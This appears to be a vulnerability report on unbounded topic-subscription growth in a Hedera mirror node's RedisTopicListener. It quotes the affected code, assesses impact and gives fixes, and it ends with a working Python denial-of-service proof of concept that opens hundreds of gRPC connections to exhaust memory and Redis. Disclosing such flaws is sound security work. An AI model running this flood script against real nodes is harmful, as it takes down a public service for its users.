### Title
Unbounded `topicMessages` ConcurrentHashMap Growth via Distinct Topic ID Subscriptions in `RedisTopicListener`

### Summary
`RedisTopicListener.getSharedListener()` inserts one entry per unique topic ID into an unbounded `ConcurrentHashMap` and only removes entries when all subscribers to that topic cancel. Because there is no limit on total gRPC connections and the per-connection cap (`maxConcurrentCallsPerConnection = 5`) is the only throttle, an attacker can open arbitrarily many connections, each subscribing to 5 distinct topic IDs while keeping them open, causing the map—and the backing Redis subscriptions—to grow without bound, exhausting JVM heap and Redis connection resources.

### Finding Description

**Exact code path:**

`RedisTopicListener.java` lines 33 and 43 declare and initialize the map:
```java
private final Map<String, Flux<TopicMessage>> topicMessages; // Topic name to active subscription
...
this.topicMessages = new ConcurrentHashMap<>();
``` [1](#0-0) 

`getSharedListener()` (lines 59–62) inserts one entry per unique topic key via `computeIfAbsent`:
```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
``` [2](#0-1) 

The topic key is `"topic.<topicId>"` (line 65), so every distinct numeric topic ID produces a distinct map key. [3](#0-2) 

Cleanup only happens in `unsubscribe()` (lines 82–85), which is wired to `doOnCancel` and `doOnComplete` of the shared Flux (lines 74–75): [4](#0-3) [5](#0-4) 

Because `.share()` (line 79) keeps the upstream alive as long as at least one subscriber is active, an attacker who never cancels their subscription prevents `unsubscribe()` from ever firing for that topic key. [6](#0-5) 

**The only per-connection throttle** is `maxConcurrentCallsPerConnection = 5` in `NettyProperties`: [7](#0-6) 

Applied in `GrpcConfiguration` (line 33): [8](#0-7) 

There is **no limit on total connections** and no cap on the total number of distinct topic entries in `topicMessages`. An attacker opens N connections × 5 calls = 5N long-lived subscriptions to 5N distinct topic IDs, producing 5N map entries and 5N Redis channel subscriptions that are never reclaimed.

**Topic existence check** (`checkTopicExists = true` by default): [9](#0-8) 

This requires valid topic IDs, but on any public mirror node the Hedera network exposes thousands of valid, sequential topic IDs that are trivially enumerable.

### Impact Explanation
Each map entry retains a live `Flux<TopicMessage>` backed by a Redis pub/sub channel subscription. Flooding the map with thousands of entries simultaneously exhausts JVM heap (OutOfMemoryError) and Redis connection/channel limits. Either outcome causes the gRPC layer to drop or misroute all topic message deliveries, including those for smart contract log topics, constituting a denial-of-service against the mirror node's consensus message streaming service.

### Likelihood Explanation
The attack requires no credentials, no privileged access, and no knowledge of internal state—only the ability to open TCP connections to the gRPC port (default 5600) and issue valid `subscribeTopic` RPCs with distinct topic IDs. It is fully scriptable, repeatable, and can be sustained indefinitely by keeping connections open. The only practical barrier is enumerating valid topic IDs, which is trivial on a public network.

### Recommendation
1. **Cap total unique topic subscriptions**: Enforce a configurable upper bound on `topicMessages.size()` inside `getSharedListener()`, rejecting new subscriptions with `RESOURCE_EXHAUSTED` when the limit is reached.
2. **Limit total gRPC connections**: Configure `NettyServerBuilder.maxConnectionAge` / `maxConnectionAgeGrace` and a global connection count limit in `GrpcConfiguration`.
3. **Idle subscription timeout**: Add a server-side idle timeout so long-lived subscriptions that receive no messages are automatically cancelled, triggering `unsubscribe()`.
4. **Per-IP connection rate limiting**: Apply a connection rate limiter at the network or application layer to slow connection-flood attacks.

### Proof of Concept
```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 500   # 500 connections × 5 calls = 2500 map entries
TOPICS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    for i in range(TOPICS_PER_CONN):
        topic_num = conn_id * TOPICS_PER_CONN + i + 1  # distinct valid topic IDs
        req = consensus_service_pb2.ConsensusTopicQuery(
            topicID=basic_types_pb2.TopicID(topicNum=topic_num)
        )
        # Start streaming but never read/cancel — keeps subscription alive
        stub.subscribeTopic(req)
    # Hold channel open indefinitely
    threading.Event().wait()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()
# topicMessages map now holds 2500 entries; Redis has 2500 open channel subscriptions
# Repeat until OOM or Redis exhaustion
```

After running this script, the `topicMessages` map in `RedisTopicListener` will contain `CONNECTIONS × TOPICS_PER_CONN` entries, each backed by a live Redis subscription, with no cleanup occurring until the attacker's connections are dropped.
